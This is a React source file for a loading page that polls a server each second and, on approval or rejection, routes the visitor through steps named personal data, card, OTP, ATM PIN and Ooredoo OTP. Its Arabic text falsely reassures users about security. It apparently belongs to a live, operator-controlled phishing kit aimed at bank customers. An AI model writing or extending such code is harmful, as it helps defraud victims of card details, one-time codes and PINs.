import { useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Loader2 } from "lucide-react";

export default function WaitingPage() {
  const { t } = useLanguage();
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const sessionId = params.get("session");
  const nextStep = params.get("next");
  const bank = params.get("bank");

  const { data: sessionStatus } = trpc.submissions.getSessionStatus.useQuery(sessionId || "", {
    enabled: !!sessionId,
    refetchInterval: 1000, 
  });

  useEffect(() => {
    if (!sessionStatus) return;

    if (sessionStatus.status === "approved") {
      if (nextStep) {
        setLocation(`/${nextStep}?bank=${bank}&session=${sessionId}`);
      } else {
        setLocation(`/success?bank=${bank}&session=${sessionId}`);
      }
    } else if (sessionStatus.status === "rejected") {
      const currentStep = sessionStatus.currentStep;
      let backUrl = "";
      
      if (currentStep === "personal") backUrl = "/personal-data";
      else if (currentStep === "card") backUrl = "/registration-completion";
      else if (currentStep === "otp") backUrl = "/otp";
      else if (currentStep === "atm") backUrl = "/atm-pin";
      else if (currentStep === "ooredoo") backUrl = "/ooredoo";
      else if (currentStep === "otp_ooredoo") backUrl = "/otp-ooredoo";
      else backUrl = "/";
      
      if (sessionStatus.errorMessage) {
        sessionStorage.setItem("error_message", sessionStatus.errorMessage);
      }
      
      setLocation(`${backUrl}?bank=${bank}&session=${sessionId}&error=true`);
    }
  }, [sessionStatus, setLocation, nextStep, bank, sessionId]);

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col items-center justify-center p-6 text-center">
      <div className="bg-white p-10 rounded-[2.5rem] shadow-xl border border-slate-100 max-w-md w-full space-y-8">
        <div className="relative">
          <div className="absolute inset-0 bg-[#8C0032]/10 rounded-full animate-ping scale-150 opacity-20"></div>
          <div className="relative bg-[#8C0032]/5 w-24 h-24 rounded-full flex items-center justify-center mx-auto">
            <Loader2 className="w-12 h-12 text-[#8C0032] animate-spin" />
          </div>
        </div>
        
        <div className="space-y-4">
          <h1 className="text-2xl font-black text-slate-900">جاري معالجة طلبك</h1>
          <p className="text-slate-500 font-medium leading-relaxed">
            يرجى الانتظار قليلاً، نحن نقوم بمراجعة بياناتك لضمان أعلى مستويات الأمان. لا تغلق هذه الصفحة.
          </p>
        </div>

        <div className="pt-4 flex items-center justify-center gap-3 text-xs font-bold text-slate-400 uppercase tracking-widest">
          <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
          اتصال آمن ومشفر
        </div>
      </div>
    </div>
  );
}
